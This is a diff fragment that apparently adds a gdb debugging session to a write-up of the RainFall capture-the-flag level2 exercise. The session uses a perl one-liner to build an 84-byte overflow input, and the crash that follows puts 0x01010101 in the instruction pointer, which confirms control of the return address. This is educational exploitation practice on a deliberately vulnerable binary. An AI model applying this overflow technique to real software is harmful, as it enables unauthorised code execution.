@@ -217,6 +217,19 @@ level2@RainFall:~$ ./level2
 
 
 
+(gdb) ! perl -e 'print "a"x80 ."\x01\x01\x01\x01"' > /tmp/lev2
+(gdb) start < /tmp/lev2
+Temporary breakpoint 5 at 0x8048542
+Starting program: /home/user/level2/level2 < /tmp/lev2
+
+Temporary breakpoint 5, 0x08048542 in main ()
+(gdb) c
+Continuing.
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x01010101 in ?? ()
+(gdb)
 
 
 
